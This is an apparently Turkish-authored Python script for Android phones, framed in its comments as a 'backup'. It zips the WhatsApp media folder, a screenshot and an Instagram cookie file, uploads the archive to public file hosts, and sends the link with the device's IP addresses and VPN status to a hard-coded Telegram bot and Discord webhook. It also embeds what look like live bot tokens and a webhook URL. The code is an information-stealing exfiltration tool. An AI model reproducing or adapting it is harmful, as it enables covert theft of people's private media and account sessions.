import os
import zipfile
import requests
import json
import socket
import platform
from datetime import datetime

# 📁 Kaynak dizinler ve dosya yolları
source_directory = "/storage/emulated/0/WhatsApp/Media"
zip_filename = "/storage/emulated/0/whatsapp_media.zip"
screenshot_filename = "/storage/emulated/0/screenshot.png"
cookie_file = "/storage/emulated/0/Download/instagram_cookies.txt"

# 🌐 API bilgileri
telegram_bot_token = "7751848089:AAFWYxFUnjr3St-LYIw-KGo4FKIGGGsvcLs"
telegram_chat_id = "6179179797"
discord_webhook_url = "https://discord.com/api/webhooks/1341129215084466307/W7hvoLTKFBVTfKGJzZt4S0SgVLEu3yh4EppicyjCZFV1VcvqUN5676oyKarhGMkfva6W"

# 🚨 VPN tespiti için bilinen IP'ler
known_vpn_ips = ["VPN_IP_1", "VPN_IP_2"]

def get_network_info():
    local_ip = socket.gethostbyname(socket.gethostname())
    try:
        public_ip = requests.get("https://api64.ipify.org").text
    except requests.RequestException:
        public_ip = "Unknown"
    return local_ip, public_ip

def is_using_vpn(public_ip):
    return public_ip in known_vpn_ips

def zip_directory(source_dir, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, source_dir))
        if os.path.exists(screenshot_filename):
            zipf.write(screenshot_filename, os.path.basename(screenshot_filename))
        if os.path.exists(cookie_file):
            zipf.write(cookie_file, os.path.basename(cookie_file))

def upload_to_gofile(zip_file):
    url = "https://store1.gofile.io/uploadFile"
    try:
        with open(zip_file, 'rb') as file:
            response = requests.post(url, files={'file': file})
        if response.status_code == 200:
            return response.json().get('data', {}).get('downloadPage')
    except requests.RequestException as e:
        print(f"Error uploading to Gofile: {e}")
    return None

def upload_to_fileio(zip_file):
    url = "https://file.io/"
    try:
        with open(zip_file, 'rb') as file:
            response = requests.post(url, files={'file': file})
        if response.status_code == 200:
            return response.json().get('link')
    except requests.RequestException as e:
        print(f"Error uploading to File.io: {e}")
    return None

def send_to_telegram(link, local_ip, public_ip, is_vpn):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    vpn_status = "Yes" if is_vpn else "No"
    text = (f"📁 WhatsApp Media + Instagram Cookies\n"
            f"🌐 Local IP: {local_ip}\n"
            f"🌍 Public IP: {public_ip}\n"
            f"🔒 VPN: {vpn_status}\n"
            f"📂 Çerezler ve medya yedeklendi!\n"
            f"🔗 Download Link: {link}")
    data = {'chat_id': telegram_chat_id, 'text': text, 'parse_mode': 'Markdown'}
    try:
        response = requests.post(url, data=data)
        return response.json() if response.status_code == 200 else None
    except requests.RequestException as e:
        print(f"Error sending message to Telegram: {e}")
    return None

def send_to_discord(link, local_ip, public_ip, is_vpn):
    embed = {
        "embeds": [{
            "title": "📂 Yeni Yedek: WhatsApp + Instagram",
            "description": f"🌐 Local IP: {local_ip}\n🌍 Public IP: {public_ip}\n🔒 VPN: {'Yes' if is_vpn else 'No'}\n📂 Yedekleme tamamlandı!\n🔗 Download: [Buraya Tıkla]({link})",
            "color": 3447003
        }]
    }
    try:
        response = requests.post(discord_webhook_url, json=embed)
        return {"status": "success"} if response.status_code == 204 else None
    except requests.RequestException as e:
        print(f"Error sending message to Discord: {e}")
    return None

def get_instagram_cookies():
    session = requests.Session()
    response = session.get("https://www.instagram.com")
    cookies = session.cookies.get_dict()

    with open(cookie_file, "w") as file:
        for key, value in cookies.items():
            file.write(f"{key}: {value}\n")

    print(f"✅ Instagram çerezleri {cookie_file} dosyasına kaydedildi.")

if __name__ == "__main__":
    local_ip, public_ip = get_network_info()
    print(f"Local IP: {local_ip}, Public IP: {public_ip}")
    
    is_vpn = is_using_vpn(public_ip)
    print(f"VPN in use: {'Yes' if is_vpn else 'No'}")

    # 🔹 Instagram çerezlerini al ve kaydet
    get_instagram_cookies()

    # 🔹 WhatsApp medya dosyalarını ZIP olarak hazırla
    zip_directory(source_directory, zip_filename)

    # 🔹 Dosyayı yükle (Gofile veya File.io)
    link = upload_to_gofile(zip_filename) or upload_to_fileio(zip_filename)

    if link:
        send_to_telegram(link, local_ip, public_ip, is_vpn)
        send_to_discord(link, local_ip, public_ip, is_vpn)
        print("✅ Yedekleme başarıyla tamamlandı!")
    else:
        print("❌ Dosya yükleme başarısız oldu!")